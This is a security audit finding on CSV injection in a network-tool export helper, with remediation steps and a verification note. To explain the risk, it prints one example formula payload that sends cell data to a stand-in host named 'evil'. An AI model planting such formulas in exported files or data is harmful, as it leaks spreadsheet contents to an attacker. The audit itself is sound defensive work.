---
id: LIBFE2-002
title: "Hand-rolled CSV writer does not neutralise spreadsheet formulas (CSV injection) in network-tool exports"
angle: lib-usage-frontend
severity: low
category: security
is_workaround: false
subsystem: "src/components/NetworkTools/exportResults"
status: fixed
resolution: "#4376 — csvCell prefixes ' to string cells starting with = + - @ TAB CR before RFC 4180 quoting"
audit: 2026-10
commit: "663465d52"
relation: new
evidence:
  - src/components/NetworkTools/exportResults.ts:36
  - src/components/NetworkTools/exportResults.ts:42
  - src/components/NetworkTools/exportResults.ts:116
  - src/components/NetworkTools/httpMonitorHistory.ts:45
  - src/components/NetworkTools/runHistory.ts:83
---

## What

`csvCell` quotes only for RFC 4180 (comma, quote, newline). It does not defuse cells that start with `=`, `+`, `-`, `@`, TAB or CR. The exported tables contain strings that remote parties control: DNS record values (TXT), traceroute hostnames (PTR), process names in open-ports, and HTTP monitor error strings. All five CSV exporters go through `tableToCsv`.

## Why it matters

Exported CSVs are typically opened in Excel, LibreOffice or Sheets. A TXT record or PTR name such as `=HYPERLINK("http://evil/?"&A1,"click")` or a DDE payload runs as a formula when the file is opened (OWASP CSV Injection). A hand-rolled writer has to handle this explicitly; libraries such as papaparse's `unparse({ escapeFormulae: true })` do it for you.

## Recommendation

In `csvCell`, prefix a single quote (`'`) to any string cell that starts with `=`, `+`, `-`, `@`, `\t` or `\r`. Do this only for string values, not numbers, so negative latencies stay numeric. Then apply the RFC 4180 quoting. Add a unit test with `=1+1` and `@SUM(A1)` cells. Switching to papaparse is not justified for a ~5-line writer; the fix belongs in the shared helper.

## Verification

Confirmed. csvCell (exportResults.ts:36) quotes only for comma, quote and newline, and nothing neutralises a leading =, +, -, @, TAB or CR. The exports include values that remote parties control, such as DNS TXT records and PTR names. Exploiting it needs the user to export and then open the file in a spreadsheet app, so low is right. No documented deliberate decision covers it.
